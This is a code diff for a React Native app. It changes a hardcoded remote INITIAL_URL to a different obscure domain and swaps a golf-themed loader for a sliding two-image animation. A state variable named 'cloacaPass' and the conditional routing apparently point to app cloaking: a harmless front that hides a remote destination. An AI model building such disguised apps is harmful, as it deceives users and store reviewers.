@@ -38,7 +38,7 @@ const App = () => {
   const [cloacaPass, setCloacaPass] = useState(null);
   console.log('cloacaPass==>', cloacaPass);
 
-  const INITIAL_URL = `https://hidden-foun-two.com/`;
+  const INITIAL_URL = `https://quick-grid-port.site/`;
   const URL_IDENTIFAIRE = `Ieb5YOUi`;
 
   useEffect(() => {
@@ -466,7 +466,28 @@ const App = () => {
   return (
     <NavigationContainer>
       {!isLoading ? (
-        <WinnetaGolfDiscoveryLoader />
+        <View style={{ flex: 1, overflow: 'hidden' }}>
+          {/* Контейнер шириною у 2 * screenWidth: два зображення поруч */}
+          <Animated.View
+            style={{
+              flexDirection: 'row',
+              width: screenWidth * 2,
+              height: '100%',
+              transform: [{ translateX: slideAnim }],
+            }}
+          >
+            <Image
+              style={{ width: screenWidth, height: '100%' }}
+              source={require('./assets/images/1.png')}
+              resizeMode="cover"
+            />
+            <Image
+              style={{ width: screenWidth, height: '100%' }}
+              source={require('./assets/images/2.png')}
+              resizeMode="cover"
+            />
+          </Animated.View>
+        </View>
       ) : (
         <Route isFatch={route} />
       )}
